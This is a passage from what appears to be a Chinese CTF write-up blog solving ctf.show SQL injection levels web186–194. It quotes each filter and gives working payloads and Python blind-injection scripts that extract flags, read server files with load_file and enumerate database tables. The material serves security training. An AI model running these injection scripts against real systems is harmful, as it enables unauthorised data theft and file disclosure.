<span class="token keyword">def</span> <span class="token function">Construct_numbers</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">'!(!pi())'</span>
    <span class="token keyword">if</span> num <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> result<span class="token operator">+</span><span class="token string">'+'</span><span class="token operator">+</span><span class="token string">'!(!pi())'</span>
    <span class="token keyword">return</span> result

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'abcdefghijklmnopqrstuvwxyz0123456789{-}'</span><span class="token punctuation">:</span>
        <span class="token comment">#字典：flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}   #群主亲传效率高</span>
        data<span class="token punctuation">[</span><span class="token string">"tableName"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ctfshow_user x right join ctfshow_user y on (hex(substr(y.pass,%s,%s)))like(hex(%s))'</span><span class="token operator">%</span><span class="token punctuation">(</span>Construct_numbers<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>Construct_numbers<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Construct_numbers<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment">#print(data)</span>
        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token comment">#print(s.text)</span>
        <span class="token keyword">if</span> <span class="token string">'$user_count = 43;'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> y
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>附上群主的脚本，更快，更美观</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># @Author: h1xa</span>
<span class="token comment"># @Date:   2020-11-07 05:00:51</span>
<span class="token comment"># @Last Modified by:   h1xa</span>
<span class="token comment"># @Last Modified time: 2020-11-07 16:28:53</span>
<span class="token comment"># @email: h1xa@ctfer.com</span>
<span class="token comment"># @link: https://ctfer.com</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php'</span>

payload <span class="token operator">=</span> <span class="token string">'ctfshow_user as a right join ctfshow_user as b on hex(substr(b.pass,{},{}))regexp(hex({char}))'</span>

strings <span class="token operator">=</span> <span class="token string">'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span>

prefix<span class="token operator">=</span> <span class="token string">'flag{'</span>

<span class="token keyword">def</span> <span class="token function">create_num</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
	ret <span class="token operator">=</span> <span class="token string">'hex(ceil(cot(-(ascii(char_length(now()))))))'</span>
	<span class="token keyword">if</span> num <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			ret <span class="token operator">=</span> ret<span class="token operator">+</span><span class="token string">'+'</span><span class="token operator">+</span><span class="token string">'hex(ceil(cot(-(ascii(char_length(now()))))))'</span>
	<span class="token keyword">return</span> ret<span class="token punctuation">;</span>


<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment">#proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}</span>
	flag<span class="token operator">=</span><span class="token string">''</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] 开始盲注第{}位'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">for</span> n <span class="token keyword">in</span> strings<span class="token punctuation">:</span>
			data <span class="token operator">=</span> <span class="token punctuation">{</span>
				<span class="token string">'tableName'</span><span class="token punctuation">:</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>create_num<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>create_num<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>char<span class="token operator">=</span>create_num<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span>
			ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
			<span class="token comment">#ret = requests.post(url,data,proxies = proxies,verify=False);</span>
			<span class="token keyword">if</span> ret<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'43'</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
				<span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
					<span class="token keyword">if</span> n <span class="token keyword">in</span> prefix<span class="token punctuation">:</span>
						flag<span class="token operator">=</span>flag<span class="token operator">+</span>n
						<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] 盲注第{}位'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"字符{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"成功"</span><span class="token punctuation">)</span>
				<span class="token keyword">else</span><span class="token punctuation">:</span>
					flag<span class="token operator">=</span>flag<span class="token operator">+</span>n
					<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
					<span class="token comment">#print(ret.text)</span>
					<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] 盲注第{}位'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"字符{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"成功"</span><span class="token punctuation">)</span>
				<span class="token keyword">break</span>
			<span class="token comment">#else:</span>
				<span class="token comment">#print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(chr(n))+"失败 数字为{}".format(n))</span>
				<span class="token comment">#print('[+] payload为{}'.format(payload.format(create_num(i+1),create_num(1),char=create_num(ord(n)))))</span>
	<span class="token keyword">return</span> flag

<span class="token keyword">print</span><span class="token punctuation">(</span>getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>sql: <code>$sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf:</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//只有admin可以获得flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名不存在'</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>md5($_POST['password'],true)</code>很经典的一个题目，详细了解可移步我的<a href="https://yq1ng.github.io/z_post/BJDCTF2020%E5%85%A8%E5%AE%B6%E6%A1%B6/#bjdctf2020easy-md5">这篇博客</a>，直接用<code>ffifdyop</code>作为密码登陆即可</p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>sql：<code>$sql = "select pass from ctfshow_user where username = {$username}";</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf</span>
 <span class="token comment">//用户名检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名非法'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">//密码检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'密码只能为数字'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">//密码判断</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'登陆成功'</span><span class="token punctuation">;</span>
      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>先上payload：<code>username=1&lt;1&amp;password=0</code>阿狸师傅tql，逻辑运算符从左到右，所以username只有0|1，也就是相当于<code>where username!=1</code>，pass为0是因为密码比较为弱类型，字符串被转为0<br>@群主思路：into file写马，但是需要知道绝对路径，(⊙﹏⊙)等我会了来填坑<br>@给大佬递茶：username=`username` 或者 `pass`&amp;pass=0即可登陆</p>
<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>sql: <code>$sql = "select pass from ctfshow_user where username = {$username}";</code>\</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf</span>
<span class="token comment">//用户名检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名非法'</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//密码检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'密码只能为数字'</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//密码判断</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'登陆成功'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说是flag在api/index.php文件中，R1chm0nd大佬hint：<code>load_file</code>，感谢R1师傅和群内大师傅们的思路，在此给出垃圾脚本，线程崩了改i=251<br>本次也学到很多，MySQL里面竟然还有定位函数</p>
<blockquote>
<p>MySQL定位函数（暂时只收集到这几个）：</p>
<ul>
<li><code>INSTR(str,substr)</code> –&gt; 返回字符串 str 中子字符串的第一个出现位置，否则为0</li>
<li><code>FIND_IN_SET(str,strlist)</code> –&gt; 返回字符串 str 中子字符串的第一个出现位置，否则为0</li>
<li><code>LOCATE(substr,str,pos)</code> –&gt; 返回字符串 str中子字符串substr的第一个出现位置, 起始位置在pos。如若substr 不在str中，则返回值为0</li>
<li><code>POSITION(substr IN str)</code> –&gt; 返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0</li>
</ul>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-27 19:00</span>
<span class="token comment"># @challenges： web189</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://460ff67c-68fc-486d-bbaf-cab2c0e2dec3.chall.ctf.show/api/index.php"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"111"</span><span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
i <span class="token operator">=</span> <span class="token number">0</span>
flag <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'concat("user",if((INSTR(load_file("/var/www/html/api/index.php"),"flag{")=%d),1,0))'</span><span class="token operator">%</span> i
    data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"529f"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">'concat("user",if((mid(load_file("/var/www/html/api/index.php"),%d,1)="%c"),1,0))'</span><span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"529f"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> x
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Give you flag :"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web190-194"><a href="#web190-194" class="headerlink" title="web190 - 194"></a>web190 - 194</h2><p>sql: <code>$sql = "select pass from ctfshow_user where username = '{$username}'";</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf</span>
<span class="token comment">//密码检测</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'密码只能为数字'</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//密码判断</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'登陆成功'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//TODO:感觉少了个啥，奇怪</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'用户名非法'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>垃圾脚本，table_name用的以前写的脚本，非常慢，可以用column_name的方法，直接猜全部的，先判断数量再逐个判断name只是为了好看。。。大佬笑笑就好，自行发挥，payload不限，我懒得改了。。。优化了，在下面</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token comment"># @Author:  yq1ng</span>
<span class="token comment"># @Date:    2020-11-17 17:30</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://af606d85-dee0-462e-8ef0-6718c277c25d.chall.ctf.show/api/'</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">}</span>
tb_num <span class="token operator">=</span> <span class="token number">0</span>
tb_length <span class="token operator">=</span> <span class="token number">0</span>
tb_name <span class="token operator">=</span> <span class="token string">''</span>
tb_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
all_column_len<span class="token operator">=</span><span class="token number">0</span>
column_name <span class="token operator">=</span> <span class="token string">''</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token comment">#table_num</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nJudging the number of tables in the database..."</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">"'or (select count(*) from information_schema.tables where table_schema=database())=%d#"</span><span class="token operator">%</span> x
    data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
    <span class="token comment">#print(data)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]There are %d tables in this database"</span><span class="token operator">%</span> x<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        tb_num <span class="token operator">=</span> x
        <span class="token keyword">break</span>
<span class="token comment">#table_name</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the table name..."</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tb_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tb_name <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token comment">#table_length</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"'or (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d#"</span><span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token comment">#print(url + payload)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            tb_length <span class="token operator">=</span> y
            <span class="token comment">#print(tb_length)</span>
            <span class="token comment">#table_name</span>
            <span class="token keyword">for</span> z <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>tb_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">r'0123456789abcdefghijklmnopqrstuvwxyz-_'</span><span class="token punctuation">:</span>
                    payload <span class="token operator">=</span> <span class="token string">"'or (select mid(table_name,%d,1) from information_schema.tables where table_schema=database() limit %d,1)='%c'#"</span><span class="token operator">%</span> <span class="token punctuation">(</span>z<span class="token punctuation">,</span>x<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
                    data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
                    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
                    <span class="token comment">#print(data)</span>
                    <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                        tb_name <span class="token operator">+=</span> i
                        <span class="token keyword">break</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> tb_name<span class="token punctuation">)</span>
            tb_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tb_name<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The table names in this database are："</span><span class="token punctuation">,</span>tb_list<span class="token punctuation">)</span>

<span class="token comment">#column_name</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGuess the column names in the %s table......"</span><span class="token operator">%</span> tb_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
